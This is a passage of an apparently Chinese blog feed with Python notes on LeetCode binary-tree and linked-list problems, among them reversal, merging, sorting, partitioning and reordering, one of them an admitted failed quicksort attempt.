<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root: TreeNode)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root: <span class="keyword">return</span> []</span><br><span class="line">        res=[]</span><br><span class="line">        queue=collections.deque([root])</span><br><span class="line">        toggle=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            list_tmp=[]</span><br><span class="line">            len_layer=len(queue)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len_layer):</span><br><span class="line">                node=queue.popleft()</span><br><span class="line">                list_tmp.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            <span class="keyword">if</span> toggle:</span><br><span class="line">                list_tmp=list_tmp[::<span class="number">-1</span>]</span><br><span class="line">            res.append(list_tmp)</span><br><span class="line">            toggle=toggle^<span class="number">1</span> <span class="comment">#异或 &lt;---</span></span><br><span class="line">            <span class="comment"># toggle=not toggle #取反 &lt;----</span></span><br><span class="line">            <span class="comment"># toggle=(toggle+1)%2 #加一取模&lt;---</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="不同的二叉搜索树-ii"><a href="#不同的二叉搜索树-ii" class="headerlink" title="不同的二叉搜索树-ii"></a>不同的二叉搜索树-ii</h2><p>给定一个整数 <em>n</em>，生成所有由 1 … <em>n</em> 为节点所组成的 <strong>二叉搜索树</strong> 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line"></span><br><span class="line">输入：3</span><br><span class="line">输出：</span><br><span class="line">[</span><br><span class="line">  [1,null,3,2],</span><br><span class="line">  [3,2,null,1],</span><br><span class="line">  [3,1,null,null,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [1,null,2,null,3]</span><br><span class="line">]</span><br><span class="line">解释：</span><br><span class="line">以上的输出对应以下 5 种不同结构的二叉搜索树：</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       &#x2F;     &#x2F;      &#x2F; \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    &#x2F;     &#x2F;       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure>

<p>主要是</p>
<ul>
<li>遍历选取不同的根节点</li>
<li>然后递归获得左子树的根节点数组，右子树的根节点数组</li>
<li>然后创建根节点，遍历左右子树两个for循环，连上根节点，添加到list中</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generateTrees</span><span class="params">(self, n: int)</span> -&gt; List[TreeNode]:</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.helper(<span class="number">1</span>,n)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(self,start,end)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> start&gt;end: <span class="keyword">return</span> [TreeNode(<span class="literal">None</span>)] <span class="comment">#这里要注意</span></span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end+<span class="number">1</span>): <span class="comment">#从零开始遍历</span></span><br><span class="line">            left=self.helper(start,i<span class="number">-1</span>)</span><br><span class="line">            right=self.helper(i+<span class="number">1</span>,end)</span><br><span class="line">            <span class="keyword">for</span> leftNode <span class="keyword">in</span> left: <span class="comment">#遍历左节点</span></span><br><span class="line">                <span class="keyword">for</span> rightNode <span class="keyword">in</span> right: <span class="comment">#遍历右节点</span></span><br><span class="line">                    root=TreeNode(i)</span><br><span class="line">                    <span class="keyword">if</span> leftNode.val!=<span class="literal">None</span>:root.left=leftNode</span><br><span class="line">                    <span class="keyword">if</span> rightNode.val!=<span class="literal">None</span>:root.right=rightNode</span><br><span class="line">                    ans.append(root)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

<h2 id="二叉树展开为链表"><a href="#二叉树展开为链表" class="headerlink" title="二叉树展开为链表"></a>二叉树展开为链表</h2><p><a href="https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list/" target="_blank" rel="noopener">二叉树展开为链表</a></p>
<p>给定一个二叉树，<a href="https://baike.baidu.com/item/原地算法/8010757" target="_blank" rel="noopener">原地</a>将它展开为一个单链表。</p>
<p>前序遍历即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(self, root: TreeNode)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Do not return anything, modify root in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> root</span><br><span class="line">        root_tmp=root</span><br><span class="line">        dummy=TreeNode(<span class="number">0</span>)</span><br><span class="line">        cur=dummy</span><br><span class="line">        stack=[]</span><br><span class="line">        <span class="keyword">while</span> stack <span class="keyword">or</span> root:</span><br><span class="line">            <span class="keyword">while</span> root:</span><br><span class="line">                stack.append(root)</span><br><span class="line">                cur.right=TreeNode(root.val)</span><br><span class="line">                cur=cur.right               </span><br><span class="line">                root=root.left</span><br><span class="line">            root=stack.pop().right</span><br><span class="line">        root_tmp.right=dummy.right.right</span><br><span class="line">        root_tmp.left=<span class="literal">None</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 链表练习</title>
    <url>/2020/07/30/2020-07-30-Linked-List-1/</url>
    <content><![CDATA[<h1 id="通用操作"><a href="#通用操作" class="headerlink" title="通用操作"></a>通用操作</h1><p>链表类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">         self.val = x</span><br><span class="line">         self.next = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>创建头指针</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dummy=ListNode(<span class="number">0</span>)</span><br><span class="line">dummy.next=head</span><br><span class="line">head=dummy</span><br></pre></td></tr></table></figure>

<p>向前移动指针</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">head=head.next <span class="comment">#移动到下一个指针</span></span><br></pre></td></tr></table></figure>

<p>删除next节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">head.next=head.next.next <span class="comment">#删除next节点</span></span><br></pre></td></tr></table></figure>

<p>反转链表，也可以是双指针操作的模板：备改二移</p>
<p>pre是一个始终在head前的节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pre=<span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> head!=<span class="literal">None</span>:</span><br><span class="line">     tmp=head.next <span class="comment">#备份节点</span></span><br><span class="line">     head.next=pre <span class="comment">#改变指针</span></span><br><span class="line">     pre=head <span class="comment">#移动指针</span></span><br><span class="line">     head=tmp <span class="comment">#移动指针</span></span><br></pre></td></tr></table></figure>

<p>用快慢指针找中点&lt;—重要</p>
<ul>
<li><p>fast 如果初始化为 head.Next 则中点在 slow.Next</p>
</li>
<li><p>fast 初始化为 head,则中点在 slow</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findMiddle</span><span class="params">(self,head)</span>:</span></span><br><span class="line">    slow=head</span><br><span class="line">    fast=head.next</span><br><span class="line">    <span class="keyword">while</span> fast!=<span class="literal">None</span> <span class="keyword">and</span> fast.next!=<span class="literal">None</span>:</span><br><span class="line">        fast=fast.next.next</span><br><span class="line">        slow=slow.next <span class="comment">#小fast一倍的速度，最终会在fast达到链表尾时，达到中点</span></span><br><span class="line">    <span class="keyword">return</span> slow</span><br></pre></td></tr></table></figure>



<h1 id="链表去重-i"><a href="#链表去重-i" class="headerlink" title="链表去重-i"></a>链表去重-i</h1><p>思路：遍历链表，使相同元素缩减为1</p>
<p>主要的困难在于dummy头节点的保持，以及head的next判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        dummpy=ListNode(<span class="number">0</span>) <span class="comment">#通用操作</span></span><br><span class="line">        dummpy.next=head</span><br><span class="line">        <span class="keyword">while</span> head!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">while</span> head.next!=<span class="literal">None</span> <span class="keyword">and</span> head.next.val==head.val: <span class="comment">#这里是while</span></span><br><span class="line">                head.next=head.next.next</span><br><span class="line">            head=head.next</span><br><span class="line">        <span class="keyword">return</span> dummpy.next</span><br></pre></td></tr></table></figure>

<h2 id="链表去重-ii"><a href="#链表去重-ii" class="headerlink" title="链表去重-ii"></a>链表去重-ii</h2><p>思路：遍历链表，使相同元素缩减为1</p>
<p>主要的困难在于dummy头节点的保持，以及head的next判断</p>
<p>重点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#head=head.next #删除的错误操作，这只是移动到下一个指针</span></span><br><span class="line">head.next=head.next.next <span class="comment">#删除的正确操作，这才是删除</span></span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">		dummy=ListNode(<span class="number">0</span>)</span><br><span class="line">        dummy.next=head</span><br><span class="line">        head=dummy</span><br><span class="line">        <span class="keyword">while</span> head.next!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> head.next.next!=<span class="literal">None</span> <span class="keyword">and</span> head.next.next.val==head.next.val: <span class="comment">#重点是这里的判断之后，就确定有重复了</span></span><br><span class="line">                retain=head.next.val <span class="comment">#然后取出重复的数</span></span><br><span class="line">                <span class="keyword">while</span> head.next <span class="keyword">and</span> head.next.val==retain: <span class="comment">#不断地遍历</span></span><br><span class="line">                    <span class="comment">#head=head.next #删除的错误操作，这只是遍历</span></span><br><span class="line">                    head.next=head.next.next <span class="comment">#删除的正确操作，这才是删除</span></span><br><span class="line">            <span class="keyword">else</span>: head=head.next</span><br><span class="line">        <span class="keyword">return</span> dummy.next</span><br></pre></td></tr></table></figure>



<h1 id="反转单链表——经典"><a href="#反转单链表——经典" class="headerlink" title="反转单链表——经典"></a>反转单链表——经典</h1><p><a href="https://leetcode-cn.com/problems/reverse-linked-list/" target="_blank" rel="noopener">反转单链表</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        pre=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> head!=<span class="literal">None</span>:</span><br><span class="line">            tmp=head.next <span class="comment">#备份节点</span></span><br><span class="line">            head.next=pre <span class="comment">#改变指针</span></span><br><span class="line">            pre=head <span class="comment">#移动指针</span></span><br><span class="line">            head=tmp <span class="comment">#移动指针</span></span><br><span class="line">        <span class="keyword">return</span> pre</span><br></pre></td></tr></table></figure>

<h1 id="反转链表（m-n）"><a href="#反转链表（m-n）" class="headerlink" title="反转链表（m,n）"></a>反转链表（m,n）</h1><p>与反转链表差不多</p>
<p>重点是将 <strong>关键的四个节点：反转的关节点</strong>、<strong>以及链表的头指针Dummy记录好</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseBetween</span><span class="params">(self, head: ListNode, m: int, n: int)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        head_dummpy=ListNode(<span class="number">0</span>)</span><br><span class="line">        head_dummpy.next=head</span><br><span class="line">        head=head_dummpy</span><br><span class="line">        pre_node=head <span class="comment">#作为要反转前的第一个节点</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;m:</span><br><span class="line">            pre_node=head <span class="comment">#pre是这样用的</span></span><br><span class="line">            head=head.next</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        first_node=head <span class="comment">#作为要反转的第一个节点</span></span><br><span class="line">        pre_node2=<span class="literal">None</span>  <span class="comment">#作为反转的最后一个节点</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;=n:</span><br><span class="line">            tmp=head.next <span class="comment">#备份</span></span><br><span class="line">            head.next=pre_node2 <span class="comment">#切换</span></span><br><span class="line">            pre_node2=head <span class="comment">#移动</span></span><br><span class="line">            head=tmp <span class="comment">#移动</span></span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        first_node.next=head <span class="comment">#此时head已经是反转链表后的第一个节点了</span></span><br><span class="line">        pre_node.next=pre_node2</span><br><span class="line">        <span class="keyword">return</span> head_dummpy.next</span><br></pre></td></tr></table></figure>



<h1 id="有序链表合并"><a href="#有序链表合并" class="headerlink" title="有序链表合并"></a>有序链表合并</h1><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/submissions/" target="_blank" rel="noopener">有序链表合并</a></p>
<p>思路：创建新链表，遍历两个旧链表，一个一个连上，与归并排序的合并差不多</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span><span class="params">(self, left: ListNode, right: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        lr=ListNode(<span class="number">0</span>)</span><br><span class="line">        lrDummy=lr</span><br><span class="line">        <span class="comment"># if left==None and l2==None: return None</span></span><br><span class="line">        <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">if</span> left.val&lt;=right.val:</span><br><span class="line">                lr.next=left</span><br><span class="line">                left=left.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lr.next=right</span><br><span class="line">                right=right.next</span><br><span class="line">            lr=lr.next <span class="comment">#不要忘了移动</span></span><br><span class="line">        <span class="keyword">if</span> left:</span><br><span class="line">            lr.next=left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lr.next=right</span><br><span class="line">        <span class="keyword">return</span> lrDummy.next</span><br></pre></td></tr></table></figure>

<h1 id="排序链表"><a href="#排序链表" class="headerlink" title="排序链表"></a>排序链表</h1><p>在 <em>O</em>(<em>n</em> log <em>n</em>) 时间复杂度和常数级空间复杂度下，对链表进行排序。</p>
<p>根据题目要求，我们需要使用快排，或者归并排序</p>
<p>思路就不赘述了</p>
<p>快排：本意是想用分隔链表的操作来做的，但是没做成功。超时了，需要再测试测试，应该是陷入了死循环或者死递归</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span> <span class="keyword">or</span> head.next==<span class="literal">None</span>: <span class="keyword">return</span> head</span><br><span class="line">        pivot=head <span class="comment">#基准值</span></span><br><span class="line">        head=head.next <span class="comment">#移动</span></span><br><span class="line">        leftList=ListNode(<span class="number">0</span>) <span class="comment">#头节点</span></span><br><span class="line">        left_i=leftList</span><br><span class="line">        rightList=ListNode(<span class="number">0</span>) <span class="comment">#头节点</span></span><br><span class="line">        right_i=rightList</span><br><span class="line">        <span class="keyword">while</span> head!=<span class="literal">None</span>:  <span class="comment">#本意是想用分隔链表的操作来做的，但是没做成功</span></span><br><span class="line">            print(head.val)</span><br><span class="line">            <span class="keyword">if</span> head.val&lt;=pivot.val:</span><br><span class="line">                left_i.next=head</span><br><span class="line">                left_i=left_i.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right_i.next=head</span><br><span class="line">                right_i=right_i.next</span><br><span class="line">            head=head.next</span><br><span class="line">        leftList=self.sortList(leftList.next) <span class="comment">#左边的</span></span><br><span class="line">        rightList=self.sortList(rightList.next) <span class="comment">#右边的</span></span><br><span class="line">        resultList=pivot</span><br><span class="line">        <span class="keyword">if</span> leftList:</span><br><span class="line">            resultList=leftList</span><br><span class="line">            <span class="keyword">while</span> leftList.next!=<span class="literal">None</span>:</span><br><span class="line">                leftList=leftList.next</span><br><span class="line">            leftList.next=pivot</span><br><span class="line">        pivot.next=rightList</span><br><span class="line">        <span class="keyword">return</span> resultList</span><br></pre></td></tr></table></figure>

<p>归并：</p>
<ul>
<li><strong>用快慢指针找中点&lt;—重要</strong></li>
<li>用有序链表合并算法合并左右两个链表</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span> <span class="comment">#排序总函数</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span> <span class="keyword">or</span> head.next==<span class="literal">None</span>: <span class="keyword">return</span> head</span><br><span class="line">        middle=self.findMiddle(head)</span><br><span class="line">        tail=middle.next <span class="comment">#右边的链表</span></span><br><span class="line">        middle.next=<span class="literal">None</span> <span class="comment">#分开两个链表</span></span><br><span class="line">        leftL=self.sortList(head)</span><br><span class="line">        rightL=self.sortList(tail)</span><br><span class="line">        <span class="keyword">return</span> self.mergeTwoList(leftL,rightL)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMiddle</span><span class="params">(self,head)</span>:</span> <span class="comment">#找中点</span></span><br><span class="line">        slow=head</span><br><span class="line">        fast=head.next</span><br><span class="line">        <span class="keyword">while</span> fast!=<span class="literal">None</span> <span class="keyword">and</span> fast.next!=<span class="literal">None</span>:</span><br><span class="line">            fast=fast.next.next</span><br><span class="line">            slow=slow.next <span class="comment">#小fast一倍的速度，最终会在fast达到链表尾时，达到中点</span></span><br><span class="line">        <span class="keyword">return</span> slow</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoList</span><span class="params">(self,left,right)</span>:</span> <span class="comment">#排序两个链表的函数</span></span><br><span class="line">        lr=ListNode(<span class="number">0</span>)</span><br><span class="line">        lrDummy=lr</span><br><span class="line">        <span class="comment"># if left==None and l2==None: return None</span></span><br><span class="line">        <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">if</span> left.val&lt;=right.val:</span><br><span class="line">                lr.next=left</span><br><span class="line">                left=left.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lr.next=right</span><br><span class="line">                right=right.next</span><br><span class="line">            lr=lr.next <span class="comment">#不要忘了移动</span></span><br><span class="line">        <span class="keyword">if</span> left:</span><br><span class="line">            lr.next=left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lr.next=right</span><br><span class="line">        <span class="keyword">return</span> lrDummy.next</span><br></pre></td></tr></table></figure>





<h1 id="分隔链表"><a href="#分隔链表" class="headerlink" title="分隔链表"></a>分隔链表</h1><p><a href="https://leetcode-cn.com/problems/partition-list/" target="_blank" rel="noopener">leetcode 86题 分隔链表</a></p>
<p>给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。</p>
<p>你应当保留两个分区中每个节点的初始相对位置。</p>
<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: head &#x3D; 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x &#x3D; 3</span><br><span class="line">输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</span><br></pre></td></tr></table></figure>

<p>其实这道题思路蛮简单的，就是代码写起来容易混乱。</p>
<p><strong>要对链表的增删查改足够清晰</strong></p>
<p>对于这道题，主要是是删除\跳过的操作一点不清晰，就会写不出来</p>
<ul>
<li><p>首先需要一个Dummy节点，这个节点是我们新的头节点，这是创建之后就不能动的</p>
</li>
<li><p>然后使 <code>Dummy.next=head</code> ，这一步使得Dummy正式成为头节点</p>
</li>
<li><p>然后使 <code>head=Dummy</code> ，这一步使得head从Dummy开始遍历（然后while循环就可以从head.next开始了）</p>
</li>
<li><p>然后我们先取出要删除的节点，然后再<code>head.next=head.next.next</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tmp=head.next <span class="comment">#先备份该节点</span></span><br><span class="line">head.next=head.next.next <span class="comment">#删除一个节点的操作</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后就删除成功了</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span><span class="params">(self, head: ListNode, x: int)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> head</span><br><span class="line">        headDummy=ListNode(<span class="number">0</span>) <span class="comment">#Dummy是作为新的链表的头指针的</span></span><br><span class="line">        headDummy.next=head</span><br><span class="line">        head=headDummy</span><br><span class="line"></span><br><span class="line">        tailDummy=ListNode(<span class="number">0</span>) <span class="comment">#tailDummy是作为第二个链表的头指针的</span></span><br><span class="line">        tail=tailDummy</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> head.next:</span><br><span class="line">            <span class="keyword">if</span> head.next.val&lt;x:</span><br><span class="line">                head=head.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment">#tmp=head.next #先备份该节点</span></span><br><span class="line">                <span class="comment">#head.next=head.next.next #删除一个节点的操作</span></span><br><span class="line">                <span class="comment">#tail.next=tmp #放到另一个链表</span></span><br><span class="line">                <span class="comment">#tail=tail.next</span></span><br><span class="line">                </span><br><span class="line">                tail.next=head.next<span class="comment">#&lt;--可以先放到tail上，再删除，而不是先删除再放到tial上</span></span><br><span class="line">                tail=tail.next</span><br><span class="line">                head.next=head.next.next                </span><br><span class="line">        tail.next=<span class="literal">None</span></span><br><span class="line">        head.next=tailDummy.next</span><br><span class="line">        <span class="keyword">return</span> headDummy.next</span><br></pre></td></tr></table></figure>

<h1 id="重排链表"><a href="#重排链表" class="headerlink" title="重排链表"></a>重排链表</h1><p><a href="https://leetcode-cn.com/problems/reorder-list/" target="_blank" rel="noopener">leetcode 143</a></p>
<p>给定一个单链表 L：L0→L1→…→Ln-1→Ln ，<br>将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→…</p>
<p>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</p>
<p>示例 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.</span><br></pre></td></tr></table></figure>

<p>示例 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure>



<p><strong>思路</strong></p>
<ul>
<li>快慢指针找中点，根据中点拆分链表</li>
<li>使右链表逆转</li>
<li>合并两链表，一左一右地合并，最后再合并最后一个不为空的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reorderList</span><span class="params">(self, head: ListNode)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Do not return anything, modify head in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        midlle=self.findMidlle(head)</span><br><span class="line">        tail=midlle.next</span><br><span class="line">        tail=self.reverse(tail) <span class="comment">#反转后面的链表</span></span><br><span class="line">        midlle.next=<span class="literal">None</span> <span class="comment">#拆分链表</span></span><br><span class="line">        Dummy=ListNode(<span class="number">0</span>) <span class="comment">#创建头节点</span></span><br><span class="line">        List_res=Dummy</span><br><span class="line">        <span class="keyword">while</span> head <span class="keyword">and</span> tail: <span class="comment">#合并两链表，一左一右地合并</span></span><br><span class="line">            List_res.next=head</span><br><span class="line">            List_res=List_res.next</span><br><span class="line">            head=head.next</span><br><span class="line"></span><br><span class="line">            List_res.next=tail</span><br><span class="line">            List_res=List_res.next</span><br><span class="line">            tail=tail.next</span><br><span class="line">        <span 